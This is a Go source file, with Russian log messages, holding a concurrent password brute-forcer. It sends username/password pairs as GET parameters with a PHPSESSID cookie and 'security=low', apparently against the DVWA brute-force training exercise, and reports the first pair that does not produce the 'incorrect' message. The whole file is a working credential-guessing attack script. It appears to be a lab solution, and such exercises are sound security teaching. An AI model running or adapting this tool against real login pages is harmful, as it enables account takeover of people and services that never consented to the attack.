package taskSolution

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

func TrySolveTask(url_string string, phpsession string, username string, password string, wg *sync.WaitGroup, sem chan struct{}) bool {
	defer wg.Done()
	sem <- struct{}{}
	defer func() { <-sem }()

	client := &http.Client{Timeout: 5 * time.Second}

	params := url.Values{}
	params.Add("username", username)
	params.Add("password", password)
	params.Add("Login", "Login")

	fullURL := fmt.Sprintf("%s?%s", url_string, params.Encode())

	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		fmt.Println("Ошибка при создании запроса:", err)
		return false
	}

	req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: phpsession})
	req.AddCookie(&http.Cookie{Name: "security", Value: "low"})

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Ошибка при выполнении запроса:", err)
		return false
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Ошибка при чтении ответа:", err)
		return false
	}

	if resp.StatusCode == http.StatusOK {
		responseBody := string(body)
		if strings.Contains(responseBody, "Username and/or password incorrect.") {
			fmt.Println("Неверная пара (логин/пароль): ", username, " ", password)

		} else {
			fmt.Println("\nУспешный запрос к ресурсу!")
			fmt.Println("\tДанные аутентификации: ", username, password)
			fmt.Println()
			fmt.Println("Завершение выполнения")
			os.Exit(0)
			return true
		}
	} else {
		fmt.Println("Ошибка:", resp.Status)
	}

	return false

}
